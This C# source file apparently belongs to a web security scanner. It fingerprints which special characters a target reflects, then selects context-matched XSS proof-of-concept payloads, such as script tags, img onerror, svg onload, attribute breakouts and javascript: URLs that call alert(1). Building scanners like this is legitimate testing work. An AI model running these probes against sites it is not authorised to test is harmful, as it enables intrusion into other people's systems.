using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Character-survival fingerprinting and context-driven XSS payload selection (Dalfox-inspired, compact).
/// </summary>
public static class XssPayloadStrategy
{
    public const string SurvivalCanary = "trowserxss<>\"'=/";

    public sealed class CharSurvival
    {
        public string Canary { get; init; } = SurvivalCanary;
        public bool SurvivedAngleOpen { get; init; }
        public bool SurvivedAngleClose { get; init; }
        public bool SurvivedDoubleQuote { get; init; }
        public bool SurvivedSingleQuote { get; init; }
        public bool SurvivedEquals { get; init; }
        public bool SurvivedSlash { get; init; }
        public string ReflectionContext { get; init; } = "unknown";
        public bool Encoded { get; init; }
        public string? Surrounding { get; init; }

        public IReadOnlyList<string> SurvivingSpecials
        {
            get
            {
                var list = new List<string>();
                if (SurvivedAngleOpen) list.Add("<");
                if (SurvivedAngleClose) list.Add(">");
                if (SurvivedDoubleQuote) list.Add("\"");
                if (SurvivedSingleQuote) list.Add("'");
                if (SurvivedEquals) list.Add("=");
                if (SurvivedSlash) list.Add("/");
                return list;
            }
        }
    }

    private static readonly string[] HtmlTextPayloads =
    [
        XssBypassProbes.DefaultPrimaryPayload,
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ];

    private static readonly string[] AttributeBreakoutPayloads =
    [
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "\" onmouseover=\"alert(1)",
        "' onfocus='alert(1)' autofocus='"
    ];

    private static readonly string[] ScriptBreakoutPayloads =
    [
        "</script><script>alert(1)</script>",
        "';alert(1)//",
        "';alert(1)//",
        "</script><img src=x onerror=alert(1)>"
    ];

    private static readonly string[] UrlAttributePayloads =
    [
        "javascript:alert(1)",
        "\"><img src=x onerror=alert(1)>"
    ];

    /// <summary>Probe which special characters survive and classify reflection context.</summary>
    public static async Task<CharSurvival?> ProbeCharSurvivalAsync(
        AutomationContext ctx,
        string urlTemplate,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        int timeoutMs,
        CancellationToken ct = default)
    {
        var markers = RequestMarkerSubstitute.ListMarkers(urlTemplate, bodyTemplate, headers);
        if (markers.Count == 0) return null;

        var subUrl = RequestMarkerSubstitute.ReplaceAllInUrl(urlTemplate, SurvivalCanary);
        var subBody = SubstituteBody(bodyTemplate, SurvivalCanary);
        var subHeaders = RequestMarkerSubstitute.ReplaceAllInHeaders(headers, SurvivalCanary) ?? headers;
        var json = await ctx.Fetch(subUrl, method, subHeaders, subBody, timeoutMs);
        ct.ThrowIfCancellationRequested();
        var (_, text, _) = HttpSecurityProbes.ParseFetchJson(json);
        if (string.IsNullOrEmpty(text)) return null;

        var matched = SurvivalCanary;
        var encoded = false;
        foreach (var variant in XssReflectionAnalyzer.GetPayloadReflectionVariants(SurvivalCanary))
        {
            if (!text.Contains(variant, StringComparison.OrdinalIgnoreCase)) continue;
            matched = variant;
            encoded = !string.Equals(variant, SurvivalCanary, StringComparison.Ordinal);
            break;
        }

        if (!text.Contains(matched, StringComparison.OrdinalIgnoreCase)
            && !text.Contains("<", StringComparison.Ordinal)
            && !text.Contains("&lt;", StringComparison.OrdinalIgnoreCase))
        {
            // Partial survival — inspect individual chars in body.
            return new CharSurvival
            {
                SurvivedAngleOpen = text.Contains('<') && !text.Contains("&lt;", StringComparison.OrdinalIgnoreCase),
                SurvivedAngleClose = text.Contains('>'),
                SurvivedDoubleQuote = text.Contains('"'),
                SurvivedSingleQuote = text.Contains('\''),
                SurvivedEquals = text.Contains('='),
                SurvivedSlash = text.Contains('/'),
                ReflectionContext = "unknown",
                Encoded = text.Contains("&lt;", StringComparison.OrdinalIgnoreCase)
            };
        }

        var analysis = XssReflectionAnalyzer.AnalyzeReflection(
            text, SurvivalCanary, matched, encoded, contentType: null);

        return new CharSurvival
        {
            SurvivedAngleOpen = ContainsUnencoded(text, "<"),
            SurvivedAngleClose = ContainsUnencoded(text, ">"),
            SurvivedDoubleQuote = text.Contains('"'),
            SurvivedSingleQuote = text.Contains('\''),
            SurvivedEquals = text.Contains('='),
            SurvivedSlash = text.Contains('/'),
            ReflectionContext = analysis.Context,
            Encoded = analysis.Encoded,
            Surrounding = analysis.Surrounding
        };
    }

    public static IReadOnlyList<string> SelectPayloads(
        CharSurvival? survival,
        string? depth,
        PayloadProfile payloadProfile = PayloadProfile.Small)
    {
        var d = SecurityScanDepth.Normalize(depth);
        var context = survival?.ReflectionContext ?? "unknown";
        var payloads = new List<string>();

        void AddRange(IEnumerable<string> src)
        {
            foreach (var p in src)
            {
                if (PayloadFitsSurvival(p, survival) && !payloads.Contains(p, StringComparer.Ordinal))
                    payloads.Add(p);
            }
        }

        switch (context)
        {
            case "html-attribute-quoted":
            case "html-attribute-unquoted":
            case "html-attribute":
            case "event-handler":
                AddRange(AttributeBreakoutPayloads);
                if (d != SecurityScanDepth.Quick)
                    AddRange(HtmlTextPayloads);
                break;
            case "script":
                AddRange(ScriptBreakoutPayloads);
                if (d == SecurityScanDepth.Deep)
                    AddRange(AttributeBreakoutPayloads);
                break;
            case "url-attribute":
                AddRange(UrlAttributePayloads);
                AddRange(AttributeBreakoutPayloads);
                break;
            case "html-text":
            case "html-tag":
                AddRange(HtmlTextPayloads);
                if (d != SecurityScanDepth.Quick)
                    AddRange(AttributeBreakoutPayloads.Take(2));
                break;
            default:
                AddRange(HtmlTextPayloads);
                if (d != SecurityScanDepth.Quick)
                {
                    AddRange(AttributeBreakoutPayloads.Take(2));
                    AddRange(ScriptBreakoutPayloads.Take(2));
                }
                break;
        }

        if (payloads.Count == 0)
            payloads.AddRange(HtmlTextPayloads);

        if (payloadProfile == PayloadProfile.Big)
        {
            foreach (var p in PayloadCatalog.Resolve("xss-basic", payloadProfile))
            {
                if (PayloadFitsSurvival(p, survival) && !payloads.Contains(p, StringComparer.Ordinal))
                    payloads.Add(p);
            }
        }

        var cap = d switch
        {
            SecurityScanDepth.Quick => 3,
            SecurityScanDepth.Deep => 10,
            _ => 6
        };
        return payloads.Take(cap).ToList();
    }

    private static bool PayloadFitsSurvival(string payload, CharSurvival? survival)
    {
        if (survival == null || survival.Encoded) return true;
        if (payload.Contains('<') && !survival.SurvivedAngleOpen) return false;
        if (payload.Contains('>') && !survival.SurvivedAngleClose && payload.Contains('<')) return false;
        if (payload.Contains('"') && !survival.SurvivedDoubleQuote
            && !payload.Contains('\'')) return false;
        return true;
    }

    private static bool ContainsUnencoded(string text, string ch) =>
        text.Contains(ch, StringComparison.Ordinal)
        && !(ch == "<" && text.Contains("&lt;", StringComparison.OrdinalIgnoreCase));

    private static string? SubstituteBody(string? template, string value)
    {
        if (string.IsNullOrEmpty(template)) return template;
        var trimmed = template.TrimStart();
        if (trimmed.StartsWith('{') || trimmed.StartsWith('['))
            return InjectionJsonBody.SubstituteMarkers(template, value);
        return RequestMarkerSubstitute.ReplaceAll(template, value);
    }
}
